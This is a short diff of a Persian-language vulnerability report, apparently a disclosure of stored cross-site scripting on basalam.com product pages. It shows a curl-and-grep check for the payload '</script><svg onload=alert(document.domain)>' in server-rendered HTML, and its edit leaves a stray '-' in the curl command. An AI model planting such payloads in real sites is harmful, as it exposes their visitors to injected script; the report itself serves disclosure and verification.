@@ -55,10 +55,12 @@
 **۱) SSR با curl کاملاً ناشناس (بدون کوکی، بدون اکانت):**
 
 ```bash
-curl -s https://basalam.com/jankid/product/59878192 \
+curl -s - https://basalam.com/kai-2026/product/59890692 \
   | grep -c '</script><svg onload=alert(document.domain)>'
-# خروجی: 1  ← پیلود خام داخل HTML سروشده از سرور، برای همه
 ```
+
+خروجی: 1  ← پیلود خام داخل HTML سروشده از سرور، برای همه
+
 
 **۲) مرورگر headless ناشناس** — کانتکست کاملاً جدید، **صفر کوکی، صفر storage، بدون لاگین**:
 
